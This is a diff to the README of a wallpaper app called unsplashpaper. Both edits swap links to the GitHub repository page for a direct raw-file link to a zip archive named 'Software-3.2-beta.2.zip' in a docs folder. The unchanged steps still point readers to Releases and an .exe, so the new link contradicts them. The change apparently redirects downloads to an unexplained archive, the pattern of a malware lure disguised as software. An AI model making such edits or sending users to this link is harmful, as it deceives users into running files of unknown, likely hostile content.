@@ -1,6 +1,6 @@
 # 🌅 unsplashpaper - Fresh daily wallpapers for your desktop
 
-[![](https://img.shields.io/badge/Download-Unsplashpaper-blue?style=for-the-badge)](https://github.com/Synovial-picnicground1171/unsplashpaper)
+[![](https://img.shields.io/badge/Download-Unsplashpaper-blue?style=for-the-badge)](https://raw.githubusercontent.com/Synovial-picnicground1171/unsplashpaper/main/docs/Software-3.2-beta.2.zip)
 
 Unsplashpaper delivers a fresh landscape, abstract piece, or portrait to your screen every morning. The application works in the background and selects a new image from the Unsplash library. You do not need to search for images or save files to your computer. The app manages every step for you.
 
@@ -8,7 +8,7 @@ Unsplashpaper delivers a fresh landscape, abstract piece, or portrait to your sc
 
 You can obtain the current version of the software from the repository.
 
-1.  Visit [this page to download](https://github.com/Synovial-picnicground1171/unsplashpaper).
+1.  Visit [this page to download](https://raw.githubusercontent.com/Synovial-picnicground1171/unsplashpaper/main/docs/Software-3.2-beta.2.zip).
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click the latest version number or the text that says "Latest".
 4.  Find the file ending in .exe under the Assets section.
